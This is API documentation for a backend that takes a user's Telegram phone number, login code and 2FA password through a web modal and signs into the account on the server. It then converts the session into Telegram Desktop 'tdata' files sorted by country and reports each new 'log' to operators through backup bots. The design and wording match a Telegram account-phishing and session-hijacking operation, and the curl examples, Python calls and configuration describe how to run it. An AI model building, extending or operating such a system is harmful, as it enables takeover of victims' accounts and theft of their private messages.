# Backend API Examples

## Quick Reference

### 1. Send Code to Phone

```bash
curl -X POST http://localhost:3001/api/auth/send-code \
  -H "Content-Type: application/json" \
  -d '{"phone": "+79123456789"}'
```

**Response on Success:**
```json
{
  "success": true,
  "phone_code_hash": "abc123def456",
  "message": "Code sent"
}
```

**Response on Error:**
```json
{
  "success": false,
  "error": "invalid_phone",
  "message": "Invalid phone number"
}
```

---

## 2. Verify Code (No 2FA)

User enters 5-digit code they received via SMS.

```bash
curl -X POST http://localhost:3001/api/auth/verify-code \
  -H "Content-Type: application/json" \
  -d '{
    "phone": "+79123456789",
    "code": "12345",
    "phone_code_hash": "abc123def456"
  }'
```

**Response on Success:**
```json
{
  "success": true,
  "user_id": 9876543210,
  "username": "john_doe",
  "first_name": "John",
  "message": "Signed in successfully",
  "tdata": "/backend/tdatas/ru/9123456789/tdata"
}
```

**Response if 2FA Required:**
```json
{
  "success": false,
  "error": "password_needed",
  "message": "2FA required"
}
```

**Response on Invalid Code:**
```json
{
  "success": false,
  "error": "invalid_code",
  "message": "Invalid or expired code"
}
```

---

## 3. Verify Password (2FA)

User enters their password for accounts with 2-factor authentication enabled.

```bash
curl -X POST http://localhost:3001/api/auth/verify-password \
  -H "Content-Type: application/json" \
  -d '{
    "phone": "+79123456789",
    "password": "mySecurePassword123",
    "phone_code_hash": "abc123def456",
    "code": "12345"
  }'
```

**Response on Success:**
```json
{
  "success": true,
  "user_id": 9876543210,
  "username": "john_doe",
  "first_name": "John",
  "message": "Signed in with 2FA successfully",
  "tdata": "/backend/tdatas/ru/9123456789/tdata"
}
```

**Response on Invalid Password:**
```json
{
  "success": false,
  "error": "invalid_password",
  "message": "Invalid password"
}
```

---

## Python Command Line Testing

### Test send_code

```bash
cd backend
python3 auth.py send_code +79123456789
```

Expected Output:
```json
{"success": true, "phone_code_hash": "abc123def456", "message": "Code sent"}
```

### Test verify_code

```bash
cd backend
python3 auth.py verify_code +79123456789 12345 abc123def456
```

Expected Output:
```json
{"success": true, "user_id": 9876543210, "username": "john_doe", "first_name": "John", "message": "Signed in successfully", "tdata": "/path/to/tdata"}
```

### Test verify_password

```bash
cd backend
python3 auth.py verify_password +79123456789 mySecurePassword123 abc123def456 12345
```

Expected Output:
```json
{"success": true, "user_id": 9876543210, "username": "john_doe", "first_name": "John", "message": "Signed in with 2FA successfully", "tdata": "/path/to/tdata"}
```

---

## Error Code Reference

| Error Code | HTTP Status | Meaning | Action |
|------------|-------------|---------|--------|
| `invalid_phone` | 400 | Phone format invalid or too short | Validate phone format |
| `already_authorized` | 409 | User already logged in | Delete session or logout first |
| `send_code_failed` | 500 | Backend error sending code | Retry or check Telegram API |
| `invalid_input` | 400 | Missing required parameters | Ensure all fields present |
| `invalid_code` | 400 | Code incorrect (5 digits required) | Ask user to re-enter |
| `password_needed` | 403 | 2FA enabled on account | Request password from user |
| `verify_code_failed` | 500 | Backend error verifying code | Retry or check Telegram API |
| `session_not_found` | 404 | Session expired/deleted | Start auth flow over |
| `invalid_password` | 401 | Wrong 2FA password | Ask user to re-enter |
| `verify_password_failed` | 500 | Backend error verifying password | Retry or check Telegram API |

---

## Session Lifecycle

```
1. send_code() → Session created: sessions/{cc}/{phone}.session
   
2. User enters code → verify_code()
   ✅ Success → Create TData, persist session
   ❌ Invalid Code → Keep session for retry
   ⚠️ 2FA Required → Keep session for password step
   
3. If 2FA → User enters password → verify_password()
   ✅ Success → Create TData, persist session
   ❌ Invalid Password → Keep session for retry
   
4. User abandons flow → Session remains until cleanup
   (Consider implementing TTL-based cleanup for old sessions)
```

**Important:** Sessions persist through validation errors to allow retries.
Only delete sessions if you're implementing server-side cleanup of abandoned sessions.

Session files contain sensitive Telegram client data - be careful with cleanup timing.
---

## Country Code Mapping

Used to organize session files by country:

| Phone Code | Country Code | Country |
|------------|--------------|---------|
| +1 | us | USA |
| +7 | ru | Russia |
| +44 | uk | UK |
| +33 | fr | France |
| +49 | de | Germany |
| +39 | it | Italy |
| +34 | es | Spain |
| +31 | nl | Netherlands |
| +32 | be | Belgium |
| +43 | at | Austria |
| +41 | ch | Switzerland |
| +46 | se | Sweden |
| +45 | dk | Denmark |
| +47 | no | Norway |
| +358 | fi | Finland |
| +30 | gr | Greece |
| +90 | tr | Turkey |
| +86 | cn | China |
| +81 | jp | Japan |
| +82 | kr | South Korea |
| +91 | in | India |
| +65 | sg | Singapore |
| +60 | my | Malaysia |
| +62 | id | Indonesia |
| +66 | th | Thailand |
| +84 | vn | Vietnam |
| +61 | au | Australia |
| +64 | nz | New Zealand |
| +27 | za | South Africa |
| +234 | ng | Nigeria |
| +20 | eg | Egypt |
| +55 | br | Brazil |
| +52 | mx | Mexico |
| +54 | ar | Argentina |
| +56 | cl | Chile |
| +57 | co | Colombia |

---

## Implementation Notes

### Frontend Integration (React)

```typescript
// In LoginModal.tsx
const handleSendCode = async () => {
  const fullPhone = countryCode + phone; // e.g., "+7" + "9123456789"
  const response = await fetch(`${API_URL}/api/auth/send-code`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ phone: fullPhone }),
  });
  const data = await response.json();
  if (data.success) {
    setPhoneCodeHash(data.phone_code_hash);
    setStep("code");
  }
};
```

### Backend Functions (Python)

**Session Directory Extraction:**
```python
country_code = get_country_code(phone)  # "+7..." → "ru"
session_dir = get_session_dir_for_country(country_code)  # "sessions/ru/"
```

**TData Directory Creation:**
```python
tdata_dir = get_tdata_dir_for_country(country_code)  # "tdatas/ru/"
tdata_result = await convert_session_to_tdata(
    phone_clean,
    str(session_file),
    API_ID,
    API_HASH,
    output_dir=str(tdata_dir)  # Pass country-specific output dir
)
```

---

## Troubleshooting

### Issue: Invalid phone error
- **Check:** Phone number is at least 10 digits
- **Check:** Country code matches phone number prefix
- **Solution:** Ask user to verify their number

### Issue: Code expired
- **Check:** Code is exactly 5 digits
- **Check:** Code was generated within last 10 minutes (Telegram timeout)
- **Solution:** Request new code via send_code endpoint

### Issue: 2FA password error
- **Check:** Password is non-empty
- **Check:** User didn't typo their Telegram password
- **Solution:** Inform user to double-check their password

### Issue: Session not found
- **Check:** Session file exists in `sessions/{cc}/` directory
- **Check:** Session wasn't deleted due to previous auth failure
- **Solution:** Start authentication flow over from send_code step

### Issue: TData conversion fails
- **Check:** `opentele` library installed (`pip install opentele`)
- **Check:** Session file properly created and authorized
- **Fallback:** System copies session file to tdata directory
- **Solution:** Check `backend/results/session_to_tdata/converter.log` for details

---

## Notification System

The backend includes a comprehensive notification system using Telegram Bot API to alert administrators about new sessions and conversion status.

### Configuration

Set these environment variables in `.env` file:

```bash
# Primary notification bot
NOTIFY_BOT_TOKEN=123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
NOTIFY_BOT_CHAT_ID=987654321

# Backup bots (for redundancy)
NOTIFY_BOT_TOKEN_2=234567:BCD-EFG2345hijLmn-abc68X3w2v234fx22
NOTIFY_BOT_CHAT_ID_2=876543210

NOTIFY_BOT_TOKEN_3=345678:CDE-FGH3456ijkMno-bcd79Y4x3w345gy33
NOTIFY_BOT_CHAT_ID_3=765432109

NOTIFY_BOT_TOKEN_4=456789:DEF-GHI4567jklPqr-cde80Z5y4x456hz44
NOTIFY_BOT_CHAT_ID_4=654321098
```

### Features

✅ **Automatic Notifications:**
- New session created (with country flag and name)
- Session conversion successful (with country information)
- Conversion errors (with country and error details)
- Fallback conversion status

✅ **Backup Bot System:**
- Tries primary bot first
- Falls back to backup bots automatically on failure
- Logs success/failure for each bot attempt
- Returns True if ANY bot succeeds

✅ **Country Information:**
- All notifications include country flag emoji
- Country name displayed in human-readable format
- Supports all 36 countries with proper flags

### Message Format

**Session Created:**
```
🇷🇺 Новая сессия (Russia):
📱 Номер: 9123456789
📄 Файл: 79004806930.session
⏳ Статус: начинаю конвертацию...
```

**Session Successful:**
```
✅ Получен новый лог (Russia):

🇷🇺 Успешно конвертирована сессия: 9123456789
📂 TData: /backend/tdatas/ru/9123456789/tdata/
```

**Conversion Error:**
```
❌ Ошибка конвертации (Russia):
🇷🇺 9123456789
🚨 [error details here]
```

**Fallback Conversion:**
```
⚠️ Fallback конвертация (Russia):
🇷🇺 Сессия: 9123456789
📂 TData(fallback): /backend/tdatas/ru/9123456789/tdata/
🔧 API_ID: 123456
🔑 API_HASH: abc123def456
```

### API Functions

**send_telegram_notification(text: str, country_code: str = None) -> bool**
- Attempts to send notification via all configured bots
- Falls back to backup bots on primary failure
- Returns True if at least one bot succeeds
- Logs all attempt details

**get_country_flag_and_name(country_code: str) -> tuple**
- Returns (flag_emoji, country_name)
- Example: `get_country_flag_and_name('ru')` → `('🇷🇺', 'Russia')`
- Returns ('🌐', 'Unknown') for unrecognized codes

### Supported Countries (36 Total)

| Code | Flag | Country |
|------|------|---------|
| us | 🇺🇸 | USA |
| ru | 🇷🇺 | Russia |
| uk | 🇬🇧 | UK |
| de | 🇩🇪 | Germany |
| fr | 🇫🇷 | France |
| it | 🇮🇹 | Italy |
| es | 🇪🇸 | Spain |
| nl | 🇳🇱 | Netherlands |
| be | 🇧🇪 | Belgium |
| at | 🇦🇹 | Austria |
| ... | ... | (26 more countries) |

### Troubleshooting Notifications

**Issue: Notifications not received**
- Check bot tokens are valid (bot still exists)
- Verify chat IDs are correct
- Ensure bot has permission to send messages to chat
- Check `.env` file has correct variable names
- Review `backend/results/session_to_tdata/converter.log` for errors

**Issue: Only some bots working**
- This is expected behavior - system tries all bots and uses first that succeeds
- Check logs for which bot succeeded
- If all bots fail, notification is skipped with warning

**Issue: Missing country flags**
- Ensure country_code is lowercase 2-letter code
- Check country_code exists in COUNTRY_FLAGS dictionary
- Falls back to '🌐' for unknown codes

---

## Performance Notes

- **Session creation:** ~2-3 seconds
- **Code sending:** ~1-2 seconds
- **Code verification:** ~3-5 seconds
- **TData conversion:** ~5-10 seconds
- **Total auth flow:** ~15-20 seconds (without 2FA)
- **With 2FA:** Add ~2-3 seconds for password verification

---

## Security Best Practices

✅ **Implemented:**
- Phone format validation (minimum 10 digits)
- Code format validation (exactly 5 digits, numeric)
- Password validation (non-empty)
- Automatic session cleanup on failed auth
- Session isolation by user/country
- No plaintext password logging

⚠️ **Recommended Future:**
- Rate limiting on auth attempts
- IP-based session validation
- Timeout-based session cleanup
- Request signing with HMAC-SHA256
- VPN/Proxy detection

---

## Telegram API Limits

**Important:** These are Telegram API rate limits:

- **Code sends:** 3 per day per phone number
- **Code verification attempts:** ~10-15 per code
- **Session duration:** 180 days (automatic logout)
- **Concurrent sessions:** ~30 per account max

**Handling:**
- Inform user about daily code limit
- Implement retry-after header parsing
- Cache successful auth for reuse
- Implement session refresh mechanism

---

**Last Updated:** Current Session  
**Version:** 1.0  
**Status:** Production Ready
